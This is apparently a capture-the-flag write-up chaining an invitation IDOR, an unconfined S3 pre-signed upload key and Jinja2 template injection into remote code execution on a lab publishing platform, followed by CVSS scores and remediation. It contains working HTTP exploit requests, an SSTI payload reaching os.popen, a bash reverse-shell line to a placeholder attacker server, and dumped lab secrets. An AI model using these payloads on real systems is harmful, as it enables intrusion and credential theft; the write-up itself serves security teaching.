# Broken Access Control -> Unauthorized S3 File modification -> SSTI -> RCE

*NOTE: This report is for educational purposes only. The target environment was an authorized offensive security CTF challenge. DO NOT attempt to target or test systems that you do not own or do not have explicit permission to test.*

# **Vulnerability Definition & Executive Summary**

The Northline Pages publishing platform suffers from Broken Access Control / Insecure Direct Object Reference (IDOR), followed by unrestricted S3 pre-signed upload key manipulation, and Server-Side Template Injection (SSTI) leading to a Remote Code Execution.

The flawed authorization logic occurs within the project invitation and membership assignment routine allowing an authenticated user to modify the target `project_id` during invitation acceptance. This allows the attacker to invite themselves into the victim's workspace, granting unauthorized editor privileges.

After that, the asset pre-signing endpoint fails to enforce strict path confinement on the destination storage key, permitting an attacker to request a pre-signed AWS S3 **PUT URL** targeting internal layout templates (`render/layout.html`). This enables the attacker to overwrite the server-side rendering template.

Lastly, when the backend preview worker processes the site build using Python's **Jinja2** rendering engine, it parses the attacker-controlled template. By traversing `self.__init__.__globals__` into loaded runtime modules (`sys.modules['__main__'].os`), execution is pivoted into arbitrary command execution, resulting in a Remote Code Execution (RCE).

Additional findings resulting from the RCE include:
- **Container Environment Variables**
- **Internal Service Credentials (e.g. tokens, private keys)**
- **Worker Service Source Code**


# Finding 1

## Broken Access Control on northline.prod.local:9080 through /api/data/project_memberships via POST Parameter "project_id" leading to unauthorized workspace invitation 

- **Target:** **northline.prod.local:9080**
- Vulnerable Endpoint: **POST /api/data/project_memberships**
- Vulnerable Component: POST Parameter `project_id`

On **northline.prod.local:9080** through **/api/data/project_memberships**, the HTTP requests containing a manipulated `project_id` and `role` parameter within the JSON payload were transmitted during invitation redemption, bypassing ownership validation checks between the issued invitation token and the target workspace.

As a result, the attacker can associate their authenticated user account with any customer project/workspace on the platform with elevated `editor` permissions, granting unauthorized read access to the workspace. 


### Proof of Concept

- Inviting myself into the workspace via the invitation link access. I created a new account named Bob. Then created an invitation meant for Bob.

<img width="1901" height="948" alt="image" src="https://github.com/user-attachments/assets/916b4f2d-24ed-4059-ad20-d0057e658c3d" />



- When accessing the generated link, we can observe that we can set the UUID of the project that we want to invite bob into, so we can replace it with the target/victim's UUID in the intercepted **POST request** when clicking "Join Team". As a result, Bob is invited as an Editor to the victim's workspace.

<img width="1892" height="886" alt="image" src="https://github.com/user-attachments/assets/246aea05-46f8-4b30-a1c5-8de4bb799bbf" />


```http
POST /api/data/project_memberships HTTP/1.1
Host: northline.prod.local:9080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://northline.prod.local:9080/invite/1XBauYJVLeCa2TxZfewg6uheRny3uBRN
Content-Type: application/json
Prefer: return=minimal
Authorization: Bearer {REDACTED}
Content-Length: 118
Origin: http://northline.prod.local:9080
Connection: keep-alive

{"project_id":"2f0fb497-eb2e-4eec-8fcb-b9e797d125e6","user_id":"421bda24-f8c0-4cbb-b673-51a77191a87f","role":"editor"}
```


<img width="1532" height="800" alt="image" src="https://github.com/user-attachments/assets/2a5d1f7a-42a0-4604-b708-77b59df7b373" />


Observe that we get a **201 Created** response from the server. 

We can confirm the effect by checking our dashboard, and observe that we have successfully invited ourselves into someone's workspace.

<img width="1867" height="896" alt="image" src="https://github.com/user-attachments/assets/b2d1bbba-a0bf-4a75-ad86-31473e8ef60e" />



- Additionally, we can view the Personal Details such as Full Name and Email Address of the members of the compromised workspace via the Team tab.

<img width="1913" height="962" alt="image" src="https://github.com/user-attachments/assets/21acd9a5-b904-4e15-8ef3-cdb1206a49e2" />

# Finding 2: 

## Arbitrary Storage Key Path Manipulation (S3 Pre-Signed Uploads) on northline.prod.local:9080 through /api/projects/{target_workspace_uuid}/uploads/sign via POST parameter "key" leading to unauthorized modification of rendering templates

- Target: **northline.prod.local:9080**
- Vulnerable Endpoint: **POST /api/projects/{project_id}/uploads/sign**
- Vulnerable Component: POST parameter `key`

On **northline.prod.local:9080** the **POST request** to **/api/projects/{project_id}/uploads/sign** accepts an arbitrary storage `key` instead of limiting uploads to the caller's asset directory. A request for a key under **projects/<target-project-id>/render/** was signed successfully. The resulting pre-signed URL permitted a PUT to **render/layout.html**, outside the intended **projects/<authorized-project-id>/assets/** namespace. This finding is exploitable after obtaining editor access to the target workspace (for example, through Finding 1).

As a result, the attacker can leverage the generated pre-signed URL to upload and overwrite template files on the underlying object storage bucket **/nl-assets/**. This allows the attacker to replace trusted rendering layouts with malicious template payloads.


### Proof of Concept 

- Checking the Templates web page, we can observe that it utilizes jinja rendering.

<img width="1568" height="750" alt="image" src="https://github.com/user-attachments/assets/026c4f6d-3041-4a1c-a6cb-0d9838b14ac6" />


- To generate a valid AWS HMAC-SHA256 pre-signed **PUT** URL, send the following **POST request**:

```http
POST /api/projects/{target_workspace_uuid}/uploads/sign HTTP/1.1
Host: northline.prod.local:9080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://northline.prod.local:9080/studio/projects/d1c2438d-33f3-4168-9b39-70442ee1117e
Content-Type: application/json
Authorization: Bearer {REDACTED}
Content-Length: 71
Origin: http://northline.prod.local:9080
Connection: keep-alive

{"key":"projects/{VICTIM_PROJECT_ID}/render/layout.html"}
```

<img width="1517" height="777" alt="image" src="https://github.com/user-attachments/assets/b4ff160b-ef5e-4fad-84d0-ab18ff280b37" />


Observe that the server responded with a PUT URL that we can now use to modify the rendering template asset (**projects/{VICTIM_PROJECT_ID}/render/layout.html**). Make sure to take note of the value of the `put_url` parameter in the response.

- To modify the rendering template asset, send the following **PUT request**, inserting the PUT URL parameters noted within the previous step.

```http
PUT /nl-assets/projects/{target_workspace_uuid}/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=northline-root%2F20261007%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261007T035045Z&X-Amz-Expires=600&X-Amz-SignedHeaders=host&X-Amz-Signature=5b163533a44710b39e05b63d43c2aa3204c436e5fc4b3cc03a945de2f15c2739 HTTP/1.1
Host: northline.prod.local:9080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://northline.prod.local:9080/studio/projects/d1c2438d-33f3-4168-9b39-70442ee1117e
Content-Type: text/html
Content-Length: 55
Origin: http://northline.prod.local:9080
Connection: keep-alive

<h1>MODIFIED BY BOB</h1>
<p>{{ site.description }}</p>
```

<img width="1888" height="983" alt="image" src="https://github.com/user-attachments/assets/326f93f4-ed41-4db5-a190-a84b985a19ba" />


- We can observe the modified result by generating another preview via the BUILD -> Generate Preview. Then wait for the preview to be done, and when visited, we can now see that we have successfully modified the rendering template.

<img width="1918" height="1002" alt="image" src="https://github.com/user-attachments/assets/0f2b32e7-d570-411c-9cee-6838a0dd346d" />





# Finding 3:
## Server-Side Template Injection (SSTI) on northline.prod.local:9080 through /nl-assets/projects/{target_workspace_uuid}/render/layout.html leading to Remote Code Execution (RCE)
 
- Target: **northline.prod.local:9080**
- Vulnerable Component: Jinja2 Template Engine (`jinja2.Environment.from_string().render()`)
- Vulnerable Routine / File: `/app/worker.py` (Background Build Worker)
- Trigger Vector: Studio Build Preview Workflow (via the web application dashboard)**


On **northline.prod.local:9080** through **/nl-assets/projects/{target_workspace_id}/render/layout.html** and the Studio preview worker trigger, HTTP requests containing custom Jinja2 expressions were injected into the template layout, which was subsequently evaluated by Python's Jinja2 runtime without context sandboxing or expression filtering.


As a result, the attacker can access `self.__init__.__globals__.sys.modules['__main__'].os.popen()` to execute arbitrary operating system commands within the preview worker container, leading to Remote Code Execution (RCE).


### Proof of Concept

- Using the unauthorized rendering template modification vulnerability from the previous step, we can confirm that the web application is vulnerable to SSTI, by sending the following request. Make sure to replace the PUT URL request with the generated URL from the previous finding. In our case, I have used the generated value within my session.

```http
PUT /nl-assets/projects/{target_workspace_uuid}/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=northline-root%2F20261007%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261007T040115Z&X-Amz-Expires=600&X-Amz-SignedHeaders=host&X-Amz-Signature=3cc5e2d6c0c930e1f33bda5e42f5e0c5f3ad8c0b9213e9e5fccd63694f4272e1 HTTP/1.1
Host: northline.prod.local:9080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://northline.prod.local:9080/studio/projects/d1c2438d-33f3-4168-9b39-70442ee1117e
Content-Type: text/html
Content-Length: 44
Origin: http://northline.prod.local:9080
Connection: keep-alive

<h1>MODIFIED BY BOB</h1>
<p>{{ 7 * 7 }}</p>
```

<img width="1845" height="953" alt="image" src="https://github.com/user-attachments/assets/83960cc4-51b4-4ec0-a032-162b4e886a89" />

Observe that the operation we have included in the Rendering Template Body was processed.


- Moreover, we can try to read the Environment Variables by sending  the following **PUT request** 

```http
PUT /nl-assets/projects/d1c2438d-33f3-4168-9b39-70442ee1117e/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=northline-root%2F20261007%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261007T063241Z&X-Amz-Expires=600&X-Amz-SignedHeaders=host&X-Amz-Signature=e17693bef57d431c0d36bfcdaa1ae3d978f9dbfba0d05dc09dd13856e97c4415 HTTP/1.1
Host: northline.prod.local:9080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, brReferer: http://northline.prod.local:9080/studio/projects/d1c2438d-33f3-4168-9b39-70442ee1117e
Content-Type: text/html
Content-Length: 107
Origin: http://northline.prod.local:9080
Connection: keep-alive

<h1>{{ site.headline }}</h1>
<p>
{{ self.__init__.__globals__.sys.modules['__main__'].os.environ }}
</p>
```


<img width="1878" height="902" alt="image" src="https://github.com/user-attachments/assets/ca1915fa-2c20-4a7e-bbc5-a51fe1706120" />


Observe that it contains internal API endpoints and tokens.

- To initialize a basic Remote Code Execution, we can send the following **PUT request**, replacing the  `{INSERT_COMMAND}` with the command you wish to run.
 
```http
PUT /nl-assets/projects/d1c2438d-33f3-4168-9b39-70442ee1117e/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=northline-root%2F20261007%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261007T070631Z&X-Amz-Expires=600&X-Amz-SignedHeaders=host&X-Amz-Signature=da055586c2fd550cb6bce25cfa1760bb7ac8767042821b8759c81cc538e5132f HTTP/1.1
Host: northline.prod.local:9080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://northline.prod.local:9080/studio/projects/d1c2438d-33f3-4168-9b39-70442ee1117e
Content-Type: text/html
Content-Length: 118
Origin: http://northline.prod.local:9080
Connection: keep-alive

<h1>{{ site.headline }}</h1>
<p>
{{ self.__init__.__globals__.sys.modules['__main__'].os.popen('{INSERT_COMMAND}').read() }}
</p>
```

In this case we tried running the command `env`, and retrieved the container environment variables seen earlier. 

```python
HOSTNAME=7f137f0e869c
WORKER_TOKEN=VeT8iX1PU251DWtkNdPHc0fzuiRU3Soq6FvdnTiJUtMu4oxtuH18rw
HOME=/home/worker
GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305
PYTHON_SHA256=5c8462af5790baf43a321a1559dbe0db06d1be4300fb85fb53c40060668e548a
RELEASE_URL=http://release:7070
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
REGISTRY_URL=http://registry:5000
LANG=C.UTF-8
PYTHON_VERSION=3.12.14
VALKEY_URL=redis://valkey:6379/0
PWD=/app
API_INTERNAL_URL=http://api:8000
```

- We have attempted to initiate a shell via the following **PUT request**, replacing the `{ATTACKER_SERVER}` and the `{PORT}` with the attacker's Server Domain/IP and the Port.

```http
PUT /nl-assets/projects/d1c2438d-33f3-4168-9b39-70442ee1117e/render/layout.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=northline-root%2F20261009%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261009T074042Z&X-Amz-Expires=600&X-Amz-SignedHeaders=host&X-Amz-Signature=aed9d8d1d61d5a9dd57b6bec67983353fac94607849f991aa09c4fd66b05db2d HTTP/1.1
Host: northline.prod.local:9080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://northline.prod.local:9080/studio/projects/236f85ce-0599-45d4-a34c-164c486dd4d9
Content-Type: text/html
Content-Length: 236
Origin: http://northline.prod.local:9080
Connection: keep-alive

<h1>{{ site.headline }}</h1>
<p>
{{ self.__init__.__globals__.sys.modules['__main__'].os.popen("setsid nohup bash -c 'bash -i >& /dev/tcp/{ATTACKER_SERVER}/{PORT} 0>&1 &' >/dev/null 2>&1 &").read() }}
</p>
```

*screenshot*

<img width="775" height="181" alt="image" src="https://github.com/user-attachments/assets/251e3738-4c62-4a20-9e70-4b516b0f6039" />

- Additionally we have also been able to read the `worker.py` source code via the following command:

```bash
cat /app/worker.py
```


*Result:*

```python
from __future__ import annotations

import hashlib
import multiprocessing
import os
import queue
import signal
import time
import traceback

import redis
import requests
from jinja2 import Environment


VALKEY_URL = os.environ["VALKEY_URL"]
API_URL = os.environ["API_INTERNAL_URL"].rstrip("/")
TOKEN = os.environ["WORKER_TOKEN"]
HEADERS = {"X-Worker-Token": TOKEN}


def render_child(template: str, site: dict, result_queue: multiprocessing.Queue):
    os.setsid()
    try:
        environment = Environment(autoescape=True)
        html = environment.from_string(template).render(site=site)
        result_queue.put({"state": "succeeded", "preview_html": html[:200_000], "error": ""})
    except BaseException as exc:
        result_queue.put({"state": "failed", "preview_html": "", "error": f"{type(exc).__name__}: {exc}"})


def process_build(build_id: str):
    job_resp = requests.post(API_URL + f"/internal/build-job/{build_id}", headers=HEADERS, timeout=5)
    if job_resp.status_code != 200:
        print(f"build {build_id}: unavailable {job_resp.status_code}", flush=True)
        return
    job = job_resp.json()
    template_sha = ""
    try:
        template_resp = requests.get(job["template_url"], timeout=8)
        template_resp.raise_for_status()
        template_bytes = template_resp.content
        if len(template_bytes) > 200_000:
            raise ValueError("Template exceeds the preview limit.")
        template = template_bytes.decode("utf-8")
        template_sha = hashlib.sha256(template_bytes).hexdigest()
        result_queue: multiprocessing.Queue = multiprocessing.Queue(maxsize=1)
        child = multiprocessing.Process(target=render_child, args=(template, job["site"], result_queue))
        child.start()
        child.join(timeout=20)
        if child.is_alive():
            try:
                os.killpg(child.pid, signal.SIGKILL)
            except ProcessLookupError:
                pass
            child.join(timeout=2)
            result = {"state": "failed", "preview_html": "", "error": "Preview exceeded the 20-second render limit."}
        else:
            try:
                result = result_queue.get(timeout=2)
            except queue.Empty:
                result = {"state": "failed", "preview_html": "", "error": "Renderer exited without a result."}
    except Exception as exc:
        result = {"state": "failed", "preview_html": "", "error": f"{type(exc).__name__}: {exc}"}
    result["build_id"] = build_id
    result["template_sha256"] = template_sha
    try:
        post = requests.post(API_URL + "/internal/build-result", json=result, headers=HEADERS, timeout=5)
        print(f"build {build_id}: {result['state']} ({post.status_code})", flush=True)
    except requests.RequestException as exc:
        print(f"build {build_id}: result delivery failed: {exc}", flush=True)


def main():
    connection = redis.Redis.from_url(VALKEY_URL, decode_responses=True)
    while True:
        try:
            item = connection.blpop("northline:builds", timeout=5)
            if item:
                process_build(item[1])
        except KeyboardInterrupt:
            raise
        except BaseException as exc:
            print(f"worker loop recovered from {type(exc).__name__}: {exc}", flush=True)
            time.sleep(2)


if __name__ == "__main__":
    main()
```

- Moreover, we have read access to the `preview_key.pem` and the `registry_credentials`

```bash
worker@7f137f0e869c:/run/secrets$ ls
preview_key.pem  registry_credentials  worker_ref
worker@7f137f0e869c:/run/secrets$ cat preview_key.pem 
-----BEGIN PRIVATE KEY-----
MC4CAQAwBQYDK2VwBCIEIEMDEAFL976Oix9UDMZysrxwlVmYKXbsu0AclwzK55m+
-----END PRIVATE KEY-----
worker@7f137f0e869c:/run/secrets$ cat registry_credentials 
preview-worker:tkDPW4xZ8wmWaPf1eucHqAf0cfBRgDNMzGjZLA
worker@7f137f0e869c:/run/secrets$ 
```

*Note: To ensure system stability, destructive actions (such as shutting down host services) were not performed.*



---
# Impact
- Unauthorized invitation of users to an external workspace that they shouldn't have access to.
- Insufficient server-side path validation allowing authenticated users to overwrite the workspace's application templates `render/layout.html` stored within object storage.
- Remote Code Execution (RCE), as a result of the Server Side Template Injection (SSTI) vulnerability. Unsandboxed evaluation of the Jinja2 templates directly executes arbitrary operating system commands with `worker` user privileges within the preview rendering container.
	- Additional Finding includes; Container environment Variable and Worker Container Source Code, Credentials such as Tokens, `.pem` Private key, Registry credentials belonging to the user.

---
# CVSS

## Finding 1: Broken Access Control leading to unauthorized workspace invitation 

*CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N - 6.5 (Medium)*

- **Attack Vector (AV):** Network (`N`) - Exploitable remotely (via the network) on the HTTP endpoints.
- **Attack Complexity (AC):** Low (`L`)  - The UUID pre-requisite can be found publicly.
- **Privileges Required (PR):** None (`N`) -  Although the exploit requires a registered account, anyone can self-register and create an account. Making it exploitable by anyone.
- **User Interaction (UI):** None (`N`) - The exploit does not require the victim to take action.
- **Scope (S):** Unchanged (`U`) -  The vulnerable component and the impacted component are the same
- **Confidentiality (C):** Low (`L`) - The resulting impact of the vulnerability exposes the Full name and Email address of the members of the compromised Workspace. No other sensitive personal details have been exposed.
- **Integrity (I):** Low (`L`) - Unauthorized invitation of users to arbitrary workspaces. No major system-wide integrity was demonstrated via the vulnerability.
- **Availability (A):** None (`N`) - There were no Availability impact shown in this vulnerability. Additionally, the editor does not have the ability to delete or alter the existing live website within the compromised Workspace.

## Finding 2: Arbitrary Storage Key Path Manipulation (S3 Pre-Signed Uploads)

*CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N - 4.3 (Medium)*

- **Attack Vector (AV): Network (`N`)** - Can be exploited over network via the HTTP requests.
- **Attack Complexity (AC): Low (`L`)** - No additional conditions required to exploit, and changing the JSON parameter value `key` will give us a valid pre-signed **PUT** URL.
- **Privileges Required (PR): Low (`L`)** - Requires an account that possesses `editor` role on the workspace (the role can be acquired via Finding 1).
- **User Interaction (UI): None (`N`)** - No interaction required from other users.
- **Scope (S): Unchanged (`U`)** - Both the asset-signing endpoint and the S3 bucket operate within the object-storage domain of the application.
- **Confidentiality (C): None (`N`)** - The generated a pre-signed `PUT` URL and uploading a template does not read or leak files directly by itself.
- **Integrity (I): Low (`L`)** - Through the vulnerability, it was shown that the attacker can modify and replace the internal layout template (`render/layout.html`) of the workspace on object storage.
- **Availability (A): None (`N`)** - The object storage service remained available, and no files were deleted.


## Finding 3: Server-Side Template Injection (SSTI) leading to a Remote Code Execution

*CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H - 9.9 (Critical)*

- **Attack Vector (AV): Network (`N`)** - Exploited remotely over the network.
- **Attack Complexity (AC): Low (`L`)** - The exploit doesn't need pre-requisites to be successful. As shown in the PoC, the Jinja2 template syntax (`{{ ... }}`) is directly processed without filtering or execution obstacles.
- **Privileges Required (PR): Low (`L`)** - Requires an account that possesses `editor` role on the workspace (the role can be acquired via Finding 1), to trigger a build preview on a project where the layout was replaced.
- **User Interaction (UI): None (`N`)** - The execution does not require any user to interact, and the preview build is initiated as soon as it is requested.
- **Scope (S): Changed (`C`)** -  The vulnerability exists within the web application template parser (Jinja2), as a result the execution breaks out directly into the underlying operating system environment of the `preview-worker` container.
- **Confidentiality (C): High (`H`)** - It was demonstrated that we can extract sensitive container environment variables (`WORKER_TOKEN`), local filesystem source code (`worker.py`), internal private keys (`preview_key.pem`), and registry credentials (`registry_credentials`).
- **Integrity (I): High (`H`)** - Integrity is rated High because the attacker achieved interactive shell access and arbitrary command execution with the privileges of the worker user.
- **Availability (A): High (`H`)** - While the container did not suffer a full denial of service, the attacker demonstrated arbitrary command execution and background process execution, with the capability to interrupt or terminate the local worker process.


## Overall Vulnerability Chain CVSS

*CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H — Score: 10.0 (Critical)*

- **Attack Vector (AV): Network (`N`)** - The exploit can be chained and executed entirely over the network via standard HTTP endpoints.
- **Attack Complexity (AC): Low (`L`)** - The vulnerability follows a deterministic, repeatable path from public project reconnaissance to remote code execution.
- **Privileges Required (PR): None (`N`)** - Privileges Required is None because, when chained from the initial entry point, an unauthenticated external attacker can self-register an account, force membership into an arbitrary workspace, modify storage keys, and achieve execution without pre-existing authorized access to the target workspace.
- **User Interaction (UI): None (`N`)** - The attack sequence can be performed by the attacker only, without any other User Interaction.
- **Scope (S): Changed (`C`)** - The execution moves from an external unprivileged perspective through the web application and into the isolated backend infrastructure layer (`worker` container via the Remote Code Execution.
- **Confidentiality (C): High (`H`)** - It is demonstrated that the chain has total compromise of local secrets, private cryptographic signing keys, internal API tokens, and backend source code.
- **Integrity (I): High (`H`)** - It was demonstrated that we can modify workspace files and achieve  arbitrary remote code execution.
- **Availability (A): High (`H`)** -  While the Web App and the underlying OS Infrastructure did not suffer a denial of service, the attacker demonstrated arbitrary command execution and background process execution, with the capability to interrupt or terminate the local worker process.

---
# Remediation

- Implementing Server-Side Authorization on Invitation Acceptance:
   - In the **POST request** to **/api/data/project_memberships** handler, remove `project_id` and role from the accepted client request body.
   - When the user redeems an invite token (from **/invite/{token}**), query the database for that specific invitation record on the backend, verify it is still valid and not expired, and automatically assign the `project_id` and role defined by the original owner in that record.

- Enforce Directory and File Path Whitelisting in S3 Pre-Signing:
   - In **POST request** to **/api/projects/{project_id}/uploads/sign**, do not allow arbitrary values in the `key` JSON parameter.
   - Reject any upload request where the path points to or includes **/render/, /layout.html,** or contains directory traversal sequences (like ../).

- Sandbox Jinja2 Template Rendering in /app/worker.py:
   - In /app/worker.py (render_child function, line 298), stop using the default Environment class.

*Vulnerable (Original):*

```python
from jinja2 import Environment
environment = Environment(autoescape=True)
```

*Remediated (Fixed):*

```python
from jinja2.sandbox import SandboxedEnvironment
environment = SandboxedEnvironment(autoescape=True)
```

   - This explicitly blocks templates from accessing dangerous internal Python attributes like `__globals__`, `__subclasses__`, and `sys.modules`.
   - If the template only needs to display basic text fields, remove full Jinja2 execution entirely and switch to a logic-less template engine (like chevron/mustache) or restrict the context dictionary strictly to primitive strings.

- Isolate Container Network and Remove Plaintext Secrets:
   - In Docker / Docker Compose network configs, move the preview-worker container into an isolated network.
   - Remove long-lived, high-privilege secrets (such as `WORKER_TOKEN`) from container environment variables (`os.environ`). Instead, use short-lived, scoped tokens generated on-demand per job.

- Deploy Web Application Firewall (WAF) Rules:
   - Deploy or configure WAF inspection rules on the reverse proxy (Caddy) to inspect incoming **POST** and **PUT** **request** bodies for common Server-Side Template Injection (SSTI) patterns (such as `{{`, `}}`, `__globals__`, and `__class__`).
	- *Note: A WAF serves only as a detection layer. It does not replace proper server-side authorization checks for IDOR or proper input whitelisting on file upload endpoints.*

- Upgrade Jinja2 to version **`3.1.6` or higher** to ensure known sandbox breakout vulnerabilities are patched.

---

# References

- [OWASP Top 10 - A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [PortSwigger Web Security Academy: Server-Side Template Injection (SSTI)](https://portswigger.net/web-security/server-side-template-injection)
- [Jinja2 Documentation: Sandboxed Environment](https://jinja.palletsprojects.com/en/3.1.x/sandbox/)
- [AWS S3 Security Best Practices: Restricting Pre-signed URLs](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
